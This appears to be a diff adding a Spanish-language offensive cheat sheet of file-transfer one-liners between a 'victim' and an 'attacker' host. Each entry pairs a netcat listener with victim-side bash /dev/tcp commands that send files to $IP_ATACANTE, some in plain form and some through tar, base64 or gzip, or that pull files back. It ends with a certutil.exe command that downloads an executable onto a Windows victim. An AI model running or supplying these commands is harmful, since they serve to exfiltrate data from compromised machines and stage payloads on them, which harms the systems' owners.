@@ -1,0 +1,44 @@
+▶ Víctima a Atacante usando CAT (Enviar archivo por TCP):
+  [Atacante] nc -nlvp 443 > archivo_recibido
+  [Víctima] cat archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima usando CAT (Recibir archivo por TCP):
+  [Atacante] nc -nlvp 443 < archivo_a_compartir
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 > archivo_recibido
+
+▶ Víctima a Atacante con BASH (Enviar archivo con descriptor):
+  [Víctima] bash -c "exec 3<> /dev/tcp/$IP_ATACANTE/443; cat archivo_a_compartir >&3"
+  [Atacante] nc -nlvp 443 > archivo_recibido
+
+▶ Atacante a Víctima con BASH (Recibir archivo con descriptor):
+  [Atacante] nc -nlvp 443 < archivo_a_compartir
+  [Víctima] bash -c "exec 3<> /dev/tcp/$IP_ATACANTE/443; cat <&3 > archivo_recibido"
+
+▶ Víctima a Atacante con TAR (Enviar archivo comprimido):
+  [Atacante] nc -nlvp 443 | tar -xvf -
+  [Víctima] tar -cvf - archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con TAR (Recibir archivo comprimido):
+  [Atacante] tar -cvf - archivo_a_compartir | nc -nlvp 443
+  [Víctima] tar -xvf - < /dev/tcp/$IP_ATACANTE/443
+
+▶ Víctima a Atacante con Base64 (Enviar codificado):
+  [Atacante] nc -nlvp 443 | base64 -d > archivo_recibido
+  [Víctima] base64 archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con Base64 (Recibir codificado):
+  [Atacante] base64 archivo_a_compartir | nc -nlvp 443
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 | base64 -d > archivo_recibido
+
+▶ Víctima a Atacante con Gzip (Enviar comprimido):
+  [Atacante] nc -nlvp 443 | gzip -d > archivo_recibido
+  [Víctima] gzip -c archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con Gzip (Recibir comprimido):
+  [Atacante] gzip -c archivo_a_compartir | nc -nlvp 443
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 | gzip -d > archivo_recibido
+
+▶ Atacante a Victima | Linux a Windows:
+  [Atacante] python3 -m http.server 80
+  [Víctima] certutil.exe -f -urlcache -split http://$IP/<Compartido>.exe
+  
